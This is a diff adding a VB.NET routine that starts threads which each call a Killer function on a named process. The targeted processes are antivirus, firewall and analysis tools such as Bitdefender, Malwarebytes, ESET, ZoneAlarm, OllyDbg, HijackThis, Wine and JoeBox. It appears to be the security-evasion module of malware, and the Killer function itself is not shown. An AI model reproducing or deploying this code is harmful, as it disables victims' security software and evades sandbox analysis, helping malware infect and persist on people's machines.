@@ -1,0 +1,97 @@
+	Shared Sub KKK
+	
+		Dim KF13 As New System.Threading.Thread(AddressOf F13)
+		
+        KF13.Start()
+        
+        Dim KF14 As New System.Threading.Thread(AddressOf F14)
+        
+        KF14.Start()
+        
+        Dim KF15 As New System.Threading.Thread(AddressOf F15)
+        
+        KF15.Start()
+        
+        Dim KF16 As New System.Threading.Thread(AddressOf F16)
+        
+        KF16.Start()
+        
+        Dim KF17 As New System.Threading.Thread(AddressOf F17)
+        
+        KF17.Start()
+        
+        Dim KF19 As New System.Threading.Thread(AddressOf F19)
+        
+        KF19.Start()
+        
+        Dim KF21 As New System.Threading.Thread(AddressOf F21)
+        
+        KF21.Start()
+        
+        Dim KF22 As New System.Threading.Thread(AddressOf F22)
+        
+        KF22.Start()
+        
+        Dim KF23 As New System.Threading.Thread(AddressOf F23)
+        
+        KF23.Start()
+        
+        Dim KF24 As New System.Threading.Thread(AddressOf F24)
+        
+        KF24.Start()
+        
+        Dim KF25 As New System.Threading.Thread(AddressOf F25)
+        
+        KF25.Start()
+        
+        Dim KF26 As New System.Threading.Thread(AddressOf F26)
+        
+        KF26.Start()
+        
+        Dim KF27 As New System.Threading.Thread(AddressOf F27)
+        
+        KF27.Start()
+        
+	End Sub
+	Shared Sub F13()
+        Killer("keyscrambler")
+    End Sub
+    Shared Sub F14()
+        Killer("bdagent")
+    End Sub
+    Shared Sub F15()
+        Killer("mbam")
+    End Sub
+    Shared Sub F16()
+        Killer("panda")
+    End Sub
+    Shared Sub F17()
+        Killer("zlclient")
+    End Sub
+    Shared Sub F19()
+        Killer("ollydbg")
+    End Sub
+    Shared Sub F21()
+        Killer("egui")
+    End Sub
+    Shared Sub F22()
+        Killer("hijackthis")
+    End Sub
+    Shared Sub F23()
+        Killer("npfmsg")
+    End Sub
+    Shared Sub F24()
+        Killer("SBAMsvc")
+    End Sub
+    Shared Sub F25()
+        Killer("wine")
+    End Sub
+    Shared Sub F26()
+        Killer("outpost")
+    End Sub
+    Shared Sub F27()
+        Killer("joeboxserver")
+        Killer("joeboxcontrol")
+    End Sub
+  
+    
